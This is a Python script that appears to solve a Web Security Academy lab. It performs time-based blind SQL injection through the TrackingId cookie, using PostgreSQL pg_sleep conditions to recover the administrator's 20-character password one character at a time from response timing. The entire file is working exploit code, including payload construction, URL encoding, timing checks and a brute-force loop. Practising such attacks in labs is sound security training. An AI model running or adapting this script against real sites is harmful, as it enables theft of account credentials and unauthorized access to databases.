import requests, string, time, urllib.parse

URL = "https://0a76009903ad74fe80a6c65c0054004b.web-security-academy.net/filter?category=Gifts"  # any page that reads TrackingId
SESSION = "LVAOuVrcU3Vx94kRaqfh2iyRacDlIiHiS"               # keep this fresh
DELAY = 5
THRESHOLD = DELAY - 0.8                                 # timing slack
CHARSET = string.ascii_lowercase + string.digits
PW_LEN = 20                                             # you said it's known

def make_payload(pos, ch):
    raw = (
        "'||(SELECT CASE WHEN (username='administrator' "
        f"AND SUBSTRING(password,{pos},1)='{ch}') "
        f"THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END FROM users)-- "
    )
    return urllib.parse.quote(raw, safe="")             # URL-encode for cookie value

def is_hit(cookies):
    t0 = time.time()
    requests.get(URL, cookies=cookies, timeout=20)
    return (time.time() - t0) >= THRESHOLD

password = ""
for pos in range(1, PW_LEN + 1):
    found = False
    for ch in CHARSET:
        cookies = {
            "TrackingId": make_payload(pos, ch),
            "session": SESSION,
        }
        if is_hit(cookies):
            password += ch
            print(f"[+] pos {pos}: {ch}   -> {password}")
            found = True
            break
    if not found:
        print("[*] No match at pos", pos, "(refresh session cookie?)")
        break

print("\n[✓] Password:", password)